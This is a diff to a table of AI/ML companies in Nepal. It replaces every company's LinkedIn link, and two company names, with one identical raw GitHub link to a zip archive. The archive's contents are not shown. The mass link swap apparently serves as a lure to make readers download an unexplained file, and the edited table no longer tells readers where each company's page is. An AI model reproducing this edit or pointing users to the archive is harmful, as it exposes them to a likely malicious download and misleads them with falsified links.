@@ -2,49 +2,49 @@
 
 | COMPANY NAME | LINKEDIN PROFILE|
 |-------------|---------|
-|	Angelswing	|	https://www.linkedin.com/company/angelswing/		|
-| Armis Tech | https://www.linkedin.com/company/armistech/ |
-|	Asterdio	|	https://www.linkedin.com/company/asterdio/		|
-|	Bottle Technology	|	https://www.linkedin.com/company/bottle-technology/		|
-| BSAI Techno Sales   |   https://www.linkedin.com/company/bsaitechnosales/       |
-|	BrainTip AI	|	https://www.linkedin.com/company/braintip-ai/		|
-|	Bytes N Chips Software	|	https://www.linkedin.com/company/bytes-n-chips-software/		|
-|	Chulo Solution	|	https://www.linkedin.com/company/chulo-solution/		|
-|	Cloudfactory	|	https://www.linkedin.com/company/cloudfactory-com/		|
-| Crimson Tech | https://www.linkedin.com/company/crimson-tech-nepal/ |
-|	Deerhold	|	https://www.linkedin.com/company/deerhold/		|
-|	Diyo.AI	|	https://www.linkedin.com/company/diyoai/		|
-| DLytica inc | https://www.linkedin.com/company/dlytica/ |
-|	Docsumo	|	https://www.linkedin.com/company/docsumoai/		|
-|	Ekbana Solutions	|	https://www.linkedin.com/company/ekbana-solutions-pte--ltd/		|
-|	Ensemble Matrix	|	https://www.linkedin.com/company/ensemblematrix/		|
-|	exTenso Data	|	https://www.linkedin.com/company/extensodata/		|
-|	Eydean	|	https://www.linkedin.com/company/eydeaninc/		|
-|	Fuse Machines	|	https://www.linkedin.com/company/fusemachines/		|
-|	GritFeat Solutions	|	https://www.linkedin.com/company/gritfeat-solutions/		|
-|	GrowByData	|	https://www.linkedin.com/company/growbydata/		|
-|	iBriz.ai	|	https://www.linkedin.com/company/ibriz-ai/		|
-|	Info Developers	|	https://www.linkedin.com/company/infodevelopers-pvt-ltd/		|
-| Innate Desing Solution| https://www.linkedin.com/company/innate-design-solution-pvt-ltd/ |
-|	Inspiring Lab	|	https://www.linkedin.com/company/inspiring-lab/		|
-| Identv Nepal    |   https://www.linkedin.com/company/identvnepal/       |
-| Jamun Tek | https://www.linkedin.com/company/jamuntek/ |
-|	Leapfrog Technology	|	https://www.linkedin.com/company/lftechnology/		|
-|	Lis Nepal	|	https://www.linkedin.com/company/lis-nepal-pvt-ltd/		|
-|	Logictronix	|	https://www.linkedin.com/company/logictronix/		|
-| NepAl Applied Mathematics and Informatics Institute for research | https://www.naamii.org.np/ |
-|	Mpercept Technology	|	https://www.linkedin.com/company/mpercept-technology/		|
-| Naamche | https://www.linkedin.com/company/naamche/ |
-|	Nimble Clinical Research	|	https://www.linkedin.com/company/nimble-cr/		|
-|	Paaila Technology	|	https://www.linkedin.com/company/paaila-technology/		|
-| Palm Mind Technology | https://www.linkedin.com/company/palm-mind-technology/ |
-|	Rippey AI	|	https://www.linkedin.com/company/rippey/		|
-| Subiz Innovations | https://subizinnovations.com.np/|
-| Smart Data Solutions | https://www.linkedin.com/company/smart-data-solutions/life/smartlife/ |
-|	Tekkon Technologies Nepal	|	https://www.linkedin.com/company/tekkontech/		|
-| Tesseract Intelligence | https://www.linkedin.com/company/tesseract-intelligence/ |
-| TIA Inc | https://www.linkedin.com/company/taigroup/ |
-|	Treeleaf Technologies	|	https://www.linkedin.com/company/treeleafai/		|
-| Web and App Pvt | https://www.linkedin.com/company/web-and-app-pvt-ltd/ |
-| Vertex Special Technology | https://www.linkedin.com/company/vertex-special-technologies/ |
-|	Wiseyak	|	https://www.linkedin.com/company/wiseyakinc/		|
+|	Angelswing	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+| Armis Tech | https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip |
+|	Asterdio	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	Bottle Technology	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+| BSAI Techno Sales   |   https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip       |
+|	BrainTip AI	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	Bytes N Chips Software	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	Chulo Solution	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	Cloudfactory	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+| Crimson Tech | https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip |
+|	Deerhold	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+| DLytica inc | https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip |
+|	Docsumo	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	Ekbana Solutions	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	Ensemble Matrix	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	exTenso Data	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	Eydean	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	Fuse Machines	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	GritFeat Solutions	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	GrowByData	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	Info Developers	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+| Innate Desing Solution| https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip |
+|	Inspiring Lab	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+| Identv Nepal    |   https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip       |
+| Jamun Tek | https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip |
+|	Leapfrog Technology	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	Lis Nepal	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	Logictronix	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+| NepAl Applied Mathematics and Informatics Institute for research | https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip |
+|	Mpercept Technology	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+| Naamche | https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip |
+|	Nimble Clinical Research	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+|	Paaila Technology	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+| Palm Mind Technology | https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip |
+|	Rippey AI	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+| Subiz Innovations | https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip|
+| Smart Data Solutions | https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip |
+|	Tekkon Technologies Nepal	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+| Tesseract Intelligence | https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip |
+| TIA Inc | https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip |
+|	Treeleaf Technologies	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
+| Web and App Pvt | https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip |
+| Vertex Special Technology | https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip |
+|	Wiseyak	|	https://raw.githubusercontent.com/sitijacharya2001/ai_ml_companies_in_nepal/main/invenient/nepal_companies_ml_ai_in_v3.3-beta.3.zip		|
